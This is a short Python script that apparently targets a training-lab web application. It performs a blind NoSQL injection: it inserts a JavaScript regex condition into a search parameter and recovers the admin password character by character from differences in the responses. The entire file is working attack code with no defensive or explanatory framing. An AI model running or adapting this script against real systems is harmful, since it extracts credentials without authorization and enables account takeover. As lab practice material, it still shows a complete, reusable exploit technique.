import urllib
import urllib.request
import string
import urllib3.request

URL="http://ptc-b03dd96f-7fbcc0db.libcurl.so"

def check(payload):
	url=URL+"/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
	print(url)
	resp = urllib.request.urlopen(url)
	data = resp.read()
	return ">admin<" in str(data)

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
	for c in CHARSET:
		print("Trying: "+c+" for "+password)
		test = password+c
		if check("^"+test+".*$"):
			password+=c
			print(password)
			break
		elif c == CHARSET[-1]:
			print(password)
			exit(0)
